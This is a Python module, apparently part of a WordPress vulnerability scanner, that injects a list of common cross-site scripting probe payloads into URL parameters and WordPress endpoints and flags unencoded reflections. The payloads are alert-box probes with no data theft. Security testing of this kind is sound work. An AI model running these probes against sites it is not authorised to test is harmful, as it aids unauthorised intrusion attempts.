#!/usr/bin/env python3
"""
Cross-Site Scripting (XSS) vulnerability scanner for WordPress
"""

import re
import html
import sys
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
sys.path.append('..')
from core.utils import print_info, print_vuln, send_request, normalize_url

# Common XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "'><script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "><script>alert('XSS')</script>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<img src=\"x\" onerror=\"alert('XSS')\">",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<details open ontoggle=alert('XSS')>",
    "';alert('XSS');//",
    "\";alert('XSS');//",
    "{{constructor.alert('XSS')}}",
    "${alert('XSS')}",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
]

def scan_xss_vulnerabilities(url):
    """
    Scan for XSS vulnerabilities
    Returns: list of vulnerable parameters/inputs
    """
    url = normalize_url(url)
    vulnerabilities = []
    
    # Test URL parameters
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    
    if query_params:
        print_info(f"Testing {len(query_params)} parameters for XSS...")
        
        for param in query_params.keys():
            for payload in XSS_PAYLOADS[:10]:  # Test first 10 payloads
                test_params = query_params.copy()
                test_params[param] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    test_query,
                    parsed_url.fragment
                ))
                
                response = send_request(test_url)
                
                if response:
                    # Check if payload is reflected unencoded
                    if payload in response.text and not html.escape(payload) in response.text:
                        vuln_info = f"Reflected XSS found in parameter '{param}' with payload: {payload}"
                        vulnerabilities.append(vuln_info)
                        print_vuln(vuln_info)
                        break
    
    # Test common WordPress XSS endpoints
    xss_endpoints = [
        f"{url}/?s=",
        f"{url}/?search=",
        f"{url}/?q=",
        f"{url}/?comment=",
        f"{url}/?author=",
        f"{url}/?p=",
        f"{url}/wp-json/wp/v2/posts?search=",
        f"{url}/wp-admin/admin-ajax.php?action=",
    ]
    
    for endpoint in xss_endpoints:
        for payload in XSS_PAYLOADS[:5]:
            test_url = endpoint + payload
            response = send_request(test_url)
            
            if response and payload in response.text:
                # Verify it's not HTML encoded
                if not html.escape(payload) in response.text:
                    vuln_info = f"Reflected XSS found at {test_url}"
                    vulnerabilities.append(vuln_info)
                    print_vuln(vuln_info)
    
    # Test for stored XSS in common fields (can be extended)
    print_info("Note: Stored XSS testing requires authentication and POST requests")
    
    return vulnerabilities